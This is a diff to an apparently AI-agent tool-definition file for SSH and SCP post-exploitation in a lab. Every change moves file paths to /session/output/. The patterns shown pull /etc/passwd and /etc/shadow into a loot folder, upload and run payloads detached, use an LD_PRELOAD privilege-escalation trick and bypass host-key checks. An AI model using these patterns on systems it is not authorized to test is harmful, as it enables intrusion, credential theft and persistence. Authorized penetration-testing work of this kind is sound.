@@ -68,12 +68,12 @@ description: >
 
   Common forms:
 
-    ssh -i /session/id_rsa -o StrictHostKeyChecking=no user@10.10.10.5 'whoami; id'
+    ssh -i /session/output/id_rsa -o StrictHostKeyChecking=no user@10.10.10.5 'whoami; id'
     sshpass -p 'Password123' ssh -o StrictHostKeyChecking=no user@10.10.10.5 'cat /etc/passwd'
     SSHPASS='Password123' sshpass -e ssh user@10.10.10.5 'sudo -l'
-    scp -i /session/id_rsa user@10.10.10.5:/etc/passwd /session/loot/passwd
-    scp -i /session/id_rsa /session/payload.sh user@10.10.10.5:/tmp/payload.sh
-    ssh -i /session/id_rsa user@10.10.10.5 'nohup /tmp/payload.sh >/dev/null 2>&1 &'
+    scp -i /session/output/id_rsa user@10.10.10.5:/etc/passwd /session/output/loot/passwd
+    scp -i /session/output/id_rsa /session/output/payload.sh user@10.10.10.5:/tmp/payload.sh
+    ssh -i /session/output/id_rsa user@10.10.10.5 'nohup /tmp/payload.sh >/dev/null 2>&1 &'
 
   Stateful operations are OUT OF SCOPE for kind:cli: -L / -R / -D port
   forwards (ssh tunnels — use the `tunnel` MCP tool); -N (no remote
@@ -290,32 +290,32 @@ usage_patterns:
   # ── ssh: one-shot remote command exec ──
   - name: "ssh — single command, key auth"
     binary: "ssh"
-    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'whoami; id; uname -a'"
+    command: "-i /session/output/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'whoami; id; uname -a'"
     when: "Canonical post-exploitation enumeration: confirm credentials work + grab basic identity. -T disables PTY for clean stdout (kind:cli has no TTY); -o StrictHostKeyChecking=no + -o UserKnownHostsFile=/dev/null are LAB-ONLY defaults to skip first-connection prompts. Quote the command to keep multi-statement chains intact."
 
   - name: "ssh — single command, key auth, custom port"
     binary: "ssh"
-    command: "-p {port} -i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'sudo -l'"
+    command: "-p {port} -i /session/output/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'sudo -l'"
     when: "Same as the previous pattern but with a non-standard SSH port (often 2222, 22022, or whatever nmap surfaces). NB: ssh's port flag is LOWERCASE -p; scp's is CAPITAL -P; sshpass's -p is PASSWORD. Easy to typo."
 
   - name: "ssh — multi-command via &&"
     binary: "ssh"
-    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'cd /tmp && pwd && ls -la && find . -name flag.txt 2>/dev/null'"
+    command: "-i /session/output/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'cd /tmp && pwd && ls -la && find . -name flag.txt 2>/dev/null'"
     when: "Run several commands in sequence in ONE SSH connection. Use && (stop on first failure) or ; (run all regardless). Quote the whole chain. The legacy `shell` method joined argv lists with && — under run_cli the LLM joins them itself."
 
   - name: "ssh — IdentitiesOnly + custom key permissions workaround"
     binary: "ssh"
-    command: "-i /session/id_rsa -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'cat ~/.ssh/authorized_keys'"
+    command: "-i /session/output/id_rsa -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'cat ~/.ssh/authorized_keys'"
     when: "Force ssh to use ONLY the supplied key (ignoring any agent / default key). Critical when the container has multiple keys in /session/ or when ssh-agent is forwarded. -o IdentitiesOnly=yes also bypasses the 'WARNING: UNPROTECTED PRIVATE KEY FILE' refusal when chmod 600 isn't possible (e.g., when the key was written by the wrong UID inside cli_in_container)."
 
   - name: "ssh — verbose for connection diagnostics"
     binary: "ssh"
-    command: "-vvv -i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'true' 2>/session/ssh-vvv.log"
+    command: "-vvv -i /session/output/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'true' 2>/session/output/ssh-vvv.log"
     when: "Triple-verbose dumps the full handshake: KEX algorithms, host key, auth methods offered, channel setup. Useful when a connection works locally but fails inside cli_in_container (often a KEX mismatch, MTU / VPN issue, or modern key-format rejection). Captures stderr separately to avoid flooding stdout."
 
   - name: "ssh — KEX / cipher fallback for legacy servers"
     binary: "ssh"
-    command: "-o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -i /session/id_rsa -T {user}@{host} 'whoami'"
+    command: "-o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa -i /session/output/id_rsa -T {user}@{host} 'whoami'"
     when: "Connecting to a legacy SSH server (CentOS 6, old IOS, embedded device) where modern OpenSSH 10.x has dropped support for the KEX / host-key / pubkey types the server speaks. Re-enable specific weak algorithms via -o ...=+ALG. NB: + adds, = replaces."
 
   - name: "ssh + sshpass — password auth via flag"
@@ -330,59 +330,59 @@ usage_patterns:
 
   - name: "ssh + sshpass — password from file"
     binary: "sshpass"
-    command: "-f /session/.password ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'whoami'"
-    when: "Read the password from a file under /session/. Useful when password contains shell-special chars that are awkward to quote. File must be readable by the container user."
+    command: "-f /session/output/.password ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -T {user}@{host} 'whoami'"
+    when: "Read the password from a file under /session/output/. Useful when password contains shell-special chars that are awkward to quote. File must be readable by the container user."
 
   - name: "ssh — kick off a detached background process"
     binary: "ssh"
-    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'nohup /tmp/payload.sh > /tmp/payload.log 2>&1 & disown && echo BACKGROUND_STARTED'"
+    command: "-i /session/output/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'nohup /tmp/payload.sh > /tmp/payload.log 2>&1 & disown && echo BACKGROUND_STARTED'"
     when: "Start a process on the target that survives the SSH disconnect. Use nohup + & + disown together; redirect output to a file (NOT a pipe — pipes are tied to the SSH session and would close). The legacy `background` method wrapped this; under run_cli the LLM constructs the bash chain. Echo a sentinel string to confirm the launch happened."
 
   - name: "ssh — environment variable injection (LD_PRELOAD / PYTHONPATH)"
     binary: "ssh"
-    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'export LD_PRELOAD=/tmp/evil.so && /usr/bin/sudo whoami'"
+    command: "-i /session/output/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'export LD_PRELOAD=/tmp/evil.so && /usr/bin/sudo whoami'"
     when: "Privesc trick: inject LD_PRELOAD or PYTHONPATH before invoking a SUID / privileged binary. Only works if (a) the binary doesn't strip env vars, (b) the agent has write access to the .so / .py path. Common against poorly-configured sudo entries."
 
   # ── scp: file copy ──
   - name: "scp — download a file from target"
     binary: "scp"
-    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {user}@{host}:/etc/passwd /session/loot/passwd"
-    when: "Pull a single text file (config, /etc/passwd, /etc/shadow, ssh keys, flags) from the target into /session/loot/. Path on remote follows the colon. Local destination is the second positional. The legacy `copy_from` method did this with a temp file then read its content — under run_cli the file lands directly in /session/."
+    command: "-i /session/output/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {user}@{host}:/etc/passwd /session/output/loot/passwd"
+    when: "Pull a single text file (config, /etc/passwd, /etc/shadow, ssh keys, flags) from the target into /session/output/loot/. Path on remote follows the colon. Local destination is the second positional. The legacy `copy_from` method did this with a temp file then read its content — under run_cli the file lands directly in /session/output/."
 
   - name: "scp — download with custom port"
     binary: "scp"
-    command: "-P {port} -i /session/id_rsa -o StrictHostKeyChecking=no {user}@{host}:/path/to/remote /session/local"
+    command: "-P {port} -i /session/output/id_rsa -o StrictHostKeyChecking=no {user}@{host}:/path/to/remote /session/output/local"
     when: "Same as the previous pattern but with non-standard SSH port. NB: scp uses CAPITAL -P for port (ssh uses LOWERCASE -p). Common typo: -p sets preserve-perms (boolean) and the next argv (which should be the port number) is misread as the source/dest."
 
   - name: "scp — upload a file to target"
     binary: "scp"
-    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /session/payload.sh {user}@{host}:/tmp/payload.sh"
-    when: "Push a script / payload / binary from /session/ to the target. The legacy `copy_to` method took raw content and wrote it to a temp file first; under run_cli the file is already in /session/."
+    command: "-i /session/output/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /session/output/payload.sh {user}@{host}:/tmp/payload.sh"
+    when: "Push a script / payload / binary from /session/ to the target. The legacy `copy_to` method took raw content and wrote it to a temp file first; under run_cli the file is already in /session/output/."
 
   - name: "scp — upload directory recursively"
     binary: "scp"
-    command: "-r -i /session/id_rsa -o StrictHostKeyChecking=no /session/exploit-tree {user}@{host}:/tmp/"
+    command: "-r -i /session/output/id_rsa -o StrictHostKeyChecking=no /session/output/exploit-tree {user}@{host}:/tmp/"
     when: "Recursively copy a directory tree (e.g., a multi-file exploit). -r is required for directories; without it scp errors with 'omitting directory'."
 
   - name: "scp + sshpass — password-auth file copy"
     binary: "sshpass"
-    command: "-p '{password}' scp -o StrictHostKeyChecking=no /session/payload.sh {user}@{host}:/tmp/"
+    command: "-p '{password}' scp -o StrictHostKeyChecking=no /session/output/payload.sh {user}@{host}:/tmp/"
     when: "Password-authenticated file upload. Same sshpass + scp wrapping as ssh + sshpass."
 
   # ── ssh: special-case patterns ──
   - name: "ssh — jump host (one-shot ProxyJump)"
     binary: "ssh"
-    command: "-i /session/id_rsa -J {jump_user}@{jump_host} -o StrictHostKeyChecking=no -T {user}@{target_host} 'whoami'"
+    command: "-i /session/output/id_rsa -J {jump_user}@{jump_host} -o StrictHostKeyChecking=no -T {user}@{target_host} 'whoami'"
     when: "Connect to {target_host} via {jump_host}. -J is supported in one-shot ssh (the jump connection is opened and closed within this single ssh process — no persistent state). Use when target is in a private subnet reachable only through a bastion host."
 
   - name: "ssh — base64 binary upload via stdin"
     binary: "ssh"
-    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'base64 -d > /tmp/payload && chmod +x /tmp/payload'"
+    command: "-i /session/output/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'base64 -d > /tmp/payload && chmod +x /tmp/payload'"
     when: "Upload a binary file via stdin: pipe the base64-encoded bytes into the ssh stdin and let the remote shell decode + write. The legacy `upload_binary` method did this in 50KB chunks via `echo CHUNK | base64 -d >> file` per call — under run_cli the LLM either uses scp (cleaner) OR streams via cli_in_container's stdin support. See gotchas for chunk-vs-stream tradeoffs."
 
   - name: "ssh — upload-and-execute script in one shot"
     binary: "ssh"
-    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'cat > /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh; rm -f /tmp/script.sh'"
+    command: "-i /session/output/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'cat > /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh; rm -f /tmp/script.sh'"
     when: "Streamline of the legacy `run_script` method: pipe the script content via cli_in_container's stdin → remote `cat > file` → exec → remove. Single SSH connection. Useful for short enum scripts. For larger scripts, prefer scp upload + ssh exec as two separate calls."
 
   # ── help / version (target=null) ──
@@ -537,7 +537,7 @@ failure_signatures:
 
   # ── 4. Auth layer ──
   - signal: "Permission denied (publickey)"
-    remediation: "Server rejected your key — either the key isn't authorized for this user, or the key file is corrupt / wrong format. Verify with `ssh-keygen -y -f /session/id_rsa` (extracts the public key) and confirm it matches `~user/.ssh/authorized_keys` on the target."
+    remediation: "Server rejected your key — either the key isn't authorized for this user, or the key file is corrupt / wrong format. Verify with `ssh-keygen -y -f /session/output/id_rsa` (extracts the public key) and confirm it matches `~user/.ssh/authorized_keys` on the target."
   - signal: "Permission denied (publickey,password)"
     remediation: "Server offered both publickey and password methods; both failed. If you have a password, add `sshpass -p PASS`; if the key is wrong, find a different key. NB: with -o BatchMode=yes, ssh skips password fallback and reports this faster."
   - signal: "Permission denied, please try again"
@@ -547,9 +547,9 @@ failure_signatures:
 
   # ── 5. Key file layer ──
   - signal: "WARNING: UNPROTECTED PRIVATE KEY FILE"
-    remediation: "ssh refuses to use a key file with permissions broader than 0600. Workarounds: (a) `chmod 600 /session/id_rsa` before invoking ssh (the write tool should do this on file creation); (b) `-o IdentitiesOnly=yes` sometimes bypasses; (c) check the file's UID — if it doesn't match the container user, the chmod may not stick."
+    remediation: "ssh refuses to use a key file with permissions broader than 0600. Workarounds: (a) `chmod 600 /session/output/id_rsa` before invoking ssh (the write tool should do this on file creation); (b) `-o IdentitiesOnly=yes` sometimes bypasses; (c) check the file's UID — if it doesn't match the container user, the chmod may not stick."
   - signal: "Load key"
-    remediation: "ssh failed to load a key file. Common causes: file doesn't exist (`Load key \"/session/x\": No such file or directory`), wrong format (`Load key \"...\": invalid format`), encrypted key without passphrase (`Load key \"...\": incorrect passphrase`). Verify with `ls -la /session/` and `head -1 /session/id_rsa` (should be `-----BEGIN ... PRIVATE KEY-----`)."
+    remediation: "ssh failed to load a key file. Common causes: file doesn't exist (`Load key \"/session/output/x\": No such file or directory`), wrong format (`Load key \"...\": invalid format`), encrypted key without passphrase (`Load key \"...\": incorrect passphrase`). Verify with `ls -la /session/` and `head -1 /session/output/id_rsa` (should be `-----BEGIN ... PRIVATE KEY-----`)."
   - signal: "invalid format"
     remediation: "Key file isn't recognizable as PEM, OPENSSH, or PKCS#8. May be a truncated download or wrong file. Re-download / re-extract; check first/last lines for the BEGIN/END markers."
   - signal: "Bad permissions"
